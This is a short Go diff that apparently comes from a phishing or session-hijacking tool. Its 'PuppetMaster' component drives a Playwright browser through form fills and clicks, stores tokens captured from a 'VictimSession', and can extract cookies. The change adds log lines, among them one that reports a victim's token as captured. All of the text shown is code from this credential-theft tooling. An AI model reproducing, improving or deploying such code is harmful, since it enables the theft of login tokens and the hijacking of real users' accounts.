@@ -215,6 +215,7 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 	// Store the token
 	session.TokenValue = tokenValue
 	pm.tokenStore.SetToken(session.VictimSession+"_"+session.Trigger.Token, tokenValue)
+	log.Success("[PUPPET] Token %s captured for session %s", session.Trigger.Token, session.VictimSession)
 
 	// Extract cookies if configured
 	if session.Trigger.ExtractCookies {
@@ -273,18 +274,24 @@ func (pm *PuppetMaster) executeActions(page playwright.Page, actions []PuppetAct
 		if value != "" && action.Selector != "" {
 			if err := page.Fill(action.Selector, value); err != nil {
 				log.Warning("[PUPPET] Failed to fill %s: %v", action.Selector, err)
+			} else {
+				log.Debug("[PUPPET] Successfully filled %s", action.Selector)
 			}
 		}
 
 		if action.Click && action.Selector != "" {
 			if err := page.Click(action.Selector); err != nil {
 				log.Warning("[PUPPET] Failed to click %s: %v", action.Selector, err)
+			} else {
+				log.Debug("[PUPPET] Successfully clicked %s", action.Selector)
 			}
 		}
 
 		if action.Enter && action.Selector != "" {
 			if err := page.Press(action.Selector, "Enter"); err != nil {
 				log.Warning("[PUPPET] Failed to press Enter on %s: %v", action.Selector, err)
+			} else {
+				log.Debug("[PUPPET] Successfully pressed Enter on %s", action.Selector)
 			}
 		}
 
